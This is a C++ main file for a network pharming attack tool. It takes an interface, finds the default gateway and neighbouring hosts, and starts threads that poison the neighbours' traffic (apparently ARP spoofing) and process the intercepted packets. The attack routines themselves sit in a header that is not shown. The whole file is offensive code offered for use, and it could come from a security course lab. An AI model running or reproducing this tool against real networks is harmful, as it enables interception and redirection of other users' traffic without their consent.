#include <iostream>
#include <string>
#include <thread>
#include <unistd.h>
#include "../header/pharmAttack.h"

int main(int argc, char *argv[])
{
    if(argc != 2)
    {
        std::cerr << "[ERROR] main: Usage: " << argv[0] << " <interface>" << std::endl;
        return 1;
    }
    const char* interface = argv[1];
    pharmAttack pharm;
    pharm.setupSocket(interface);
    uint32_t gatewayIp = util::getDefaultGateway(interface);
    pharm.getNeighbours(gatewayIp);
    // make a thread for poisonNeighbours
    std::thread poisonNeighboursThread(&pharmAttack::poisonNeighbours, &pharm);
    sleep(1);
    std::cerr << "[INFO] main: start processPackets" << std::endl;
    std::thread processPacketsThread(&pharmAttack::processPackets, &pharm, interface);

    poisonNeighboursThread.join();
    processPacketsThread.join();
}